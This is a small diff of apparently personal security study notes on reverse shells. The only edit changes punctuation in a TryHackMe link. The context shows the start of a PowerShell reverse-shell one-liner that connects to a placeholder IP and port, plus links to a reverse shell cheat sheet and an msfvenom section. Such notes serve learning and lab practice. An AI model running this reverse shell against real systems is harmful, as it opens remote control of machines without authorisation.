@@ -87,7 +87,7 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);
 
 Note that `<IP>` and `<PORT>` need to be appropriately replaced in the above code.
 
-* [2021-10-02 - TryHackMe: Complete Beginner](2021-10-02-tryhackme-complete-beginner.md)
+* [2021-10-02 — TryHackMe: Complete Beginner](2021-10-02-tryhackme-complete-beginner.md)
 * [PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ### msfvenom
